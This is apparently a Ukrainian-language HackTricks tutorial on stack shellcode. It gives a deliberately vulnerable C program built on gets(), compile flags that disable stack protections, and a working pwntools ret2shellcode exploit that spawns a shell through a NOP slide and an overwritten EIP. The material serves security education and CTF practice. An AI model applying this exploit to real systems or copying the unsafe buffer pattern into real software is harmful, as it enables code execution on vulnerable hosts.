# Stack Shellcode

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

**Stack shellcode** - це техніка, що використовується в бінарному експлуатації, де зловмисник записує shellcode в стек вразливої програми, а потім модифікує **Instruction Pointer (IP)** або **Extended Instruction Pointer (EIP)**, щоб вказати на місце розташування цього shellcode, що призводить до його виконання. Це класичний метод, що використовується для отримання несанкціонованого доступу або виконання довільних команд на цільовій системі. Ось розбір процесу, включаючи простий приклад на C та як ви можете написати відповідний експлойт, використовуючи Python з **pwntools**.

### C Example: A Vulnerable Program

Давайте почнемо з простого прикладу вразливої програми на C:
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
Ця програма вразлива до переповнення буфера через використання функції `gets()`.

### Компіляція

Щоб скомпілювати цю програму, вимкнувши різні захисти (щоб змоделювати вразливе середовище), ви можете використати наступну команду:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
- `-fno-stack-protector`: Вимикає захист стеку.
- `-z execstack`: Робить стек виконуваним, що необхідно для виконання shellcode, збереженого в стеці.
- `-no-pie`: Вимикає Position Independent Executable, що полегшує прогнозування адреси пам'яті, де буде розташований наш shellcode.
- `-m32`: Компілірує програму як 32-бітний виконуваний файл, що часто використовується для спрощення розробки експлойтів.

### Python Exploit using Pwntools

Ось як ви можете написати експлойт на Python, використовуючи **pwntools** для виконання атаки **ret2shellcode**:
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
Цей скрипт створює корисне навантаження, що складається з **NOP слайду**, **shellcode**, а потім перезаписує **EIP** адресою, що вказує на NOP слайд, забезпечуючи виконання shellcode.

**NOP слайд** (`asm('nop')`) використовується для збільшення ймовірності того, що виконання "зсуватиметься" в наш shellcode незалежно від точної адреси. Налаштуйте аргумент `p32()` на початкову адресу вашого буфера плюс зсув, щоб потрапити в NOP слайд.

## Захист

- [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **повинен бути вимкнений** для того, щоб адреса була надійною під час виконання, інакше адреса, де буде зберігатися функція, не завжди буде однаковою, і вам знадобиться якийсь leak, щоб зрозуміти, де завантажена функція win.
- [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/) також повинні бути вимкнені, інакше скомпрометована адреса повернення EIP ніколи не буде виконана.
- [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md) **захист** стеку запобігатиме виконанню shellcode всередині стеку, оскільки ця область не буде виконуваною.

## Інші приклади та посилання

- [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)
- [https://guyinatuxedo.github.io/06-bof_shellcode/csaw17_pilot/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/csaw17_pilot/index.html)
- 64 біт, ASLR з leak адреси стеку, записати shellcode і перейти до нього
- [https://guyinatuxedo.github.io/06-bof_shellcode/tamu19_pwn3/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/tamu19_pwn3/index.html)
- 32 біт, ASLR з leak стеку, записати shellcode і перейти до нього
- [https://guyinatuxedo.github.io/06-bof_shellcode/tu18_shellaeasy/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/tu18_shellaeasy/index.html)
- 32 біт, ASLR з leak стеку, порівняння для запобігання виклику exit(), перезаписати змінну значенням і записати shellcode і перейти до нього

{{#include ../../../banners/hacktricks-training.md}}
